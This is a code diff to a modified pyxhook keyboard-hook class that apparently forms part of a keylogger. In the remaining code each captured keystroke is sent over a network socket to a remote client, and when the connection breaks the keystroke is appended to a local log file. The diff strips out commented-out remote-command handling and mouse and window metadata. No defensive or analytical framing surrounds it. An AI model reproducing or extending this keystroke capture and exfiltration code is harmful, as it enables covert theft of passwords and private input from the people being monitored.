@@ -447,13 +447,7 @@ class pyxhookkeyevent:
         if flag:
             try:
                 client_sock.send((self.Key).encode('utf-8'))
-#                self.data = client_sock.recv(1024)
-#                if not self.data:
-#                    break
-#                if (self.data).decode('utf-8') == 'grave':
-#                    hm.cancel()
-            except:
-#                print("Disconnected Writing To File")
+            except BrokenPipeError :
                 global fob
                 fob=open(log_file,'a')
                 fob.write(self.Key)
@@ -466,43 +460,9 @@ class pyxhookkeyevent:
             fob.write(' ')
         #client_sock.send('\n'.encode('utf-8'))
         return '\n'.join((
-#            'Window Handle: {s.Window}',
-#            'Window Name: {s.WindowName}',
-#            'Window\'s Process Name: {s.WindowProcName}',
             'Key Pressed: {s.Key}',
-#            'Ascii Value: {s.Ascii}',
-#            'KeyID: {s.KeyID}',
-#            'ScanCode: {s.ScanCode}',
-#            'MessageName: {s.MessageName}',
         )).format(s=self)
 
-
-#class pyxhookmouseevent:
-#    """This is the class that is returned with each key event.f
-#    It simply creates the variables below in the class.
-#
-#        Window         : The handle of the window.
-#        WindowName     : The name of the window.
-#        WindowProcName : The backend process for the window.
-#        Position       : 2-tuple (x,y) coordinates of the mouse click.
-#        MessageName    : "mouse left|right|middle down",
-#                         "mouse left|right|middle up".
-#    """
-
-#    def __init__(
-#            self, Window, WindowName, WindowProcName, Position, MessageName):
-#        self.Window = Window
-#        self.WindowName = WindowName
-#        self.WindowProcName = WindowProcName
-#        self.Position = Position
-#        self.MessageName = MessageName
-
-#    def __str__(self):
-#        return '\n'.join((
-#            'Window Handle: {s.Window}',
-#            'Window\'s Process Name: {s.WindowProcName}',
-#            'Position: {s.Position}',
-#            'MessageName: {s.MessageName}',)).format(s=self)
 
 flag = False
 flag_2 = False
